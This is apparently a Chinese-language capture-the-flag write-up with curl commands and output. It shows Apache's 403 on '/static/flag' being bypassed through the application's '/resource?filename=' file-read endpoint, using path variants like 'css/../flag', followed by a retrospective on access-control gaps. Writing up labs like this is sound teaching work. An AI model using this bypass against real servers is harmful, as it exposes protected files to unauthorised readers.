## 题解

### 入口与指纹

`Apache/2.4.67 (Debian)`，`/` 重定向到 `/login`。登录页有个可疑的资源引用：

```html
<link href="/resource?filename=css/bootstrap.min.css" rel="stylesheet">
```

即 `/resource?filename=<相对路径>` 是一个**由应用代读文件**的接口。

### 关键观察

**1. `/static/` 开了目录列表，直接暴露 `flag`。**

```bash
curl http://$T/static/
```

```html
<title>Index of /static</title>
<ul><li><a href="/"> Parent Directory</a></li>
<li><a href="css/"> css/</a></li>
<li><a href="flag"> flag</a></li>
<li><a href="js/"> js/</a></li>
</ul>
```

**2. 直接访问被 Apache 拒绝。**

```bash
curl -i http://$T/static/flag
# HTTP/1.1 403 Forbidden
```

说明有 `Require all denied` / `<Files "flag">` 之类的规则挡在 Web 层。

**3. 用 `/resource` 代读就绕过了。**

`/resource` 的根目录就是 `/static/`（`filename=css/style.css` 能读到），
所以直接要 `flag`：

```bash
curl http://$T/resource?filename=flag
# flag{dd9ebc95-e139-463c-9399-cceff66b33d4}
```

Apache 的 403 只作用于**直接请求**；`/resource` 是应用进程自己 `open()` 文件，
不受该规则约束。

### 利用链

```bash
T=$(head -1 .target)
curl -sS "http://$T/resource?filename=flag"
```

等价的几种写法都通（路径归一化）：

```text
filename=flag
filename=./flag
filename=css/../flag
```

### flag 位置

`/static/flag` 文件内容。目录列表只给出文件名，直接访问 403，
必须经 `/resource` 代读。

## 复盘

- **目录列表本身就是情报。** `/static/` 一列出来就看到 `flag`，
  比爆破文件名快得多。任何 `Index of` 页面都应当先看一遍。
- **403 ≠ 读不到。** Apache 的 `<Files>`/`Require` 规则挡的是"直接请求这个 URL"；
  如果应用里另有文件读取功能，它通常**不受 Web 层规则约束**。
  判据是：先确认读文件的接口的根目录在哪（这里是 `/static/`），再要同名文件。
- **`/resource?filename=` 这种"参数化资源代理"是常见的设计。**
  它把静态资源统一走应用，便于加认证/改路径——但也因此把 Web 层的访问控制
  变成了应用层的（缺失的）访问控制。
- **`..` 在这里被归一化而不是被拦。** `css/../flag` 能过，说明
  应用做的是 `os.path.join` + 存在性判断，没有 `..` 过滤；
  但超出根目录（`../flag`）会 404，说明根目录之外还是不可达。
- 这题**完全不需要登录**。看到 `302 /login` 时不要一头扎进认证绕过——
  先把同域下的其它路径（`/static/`、`/resource`）看一遍。
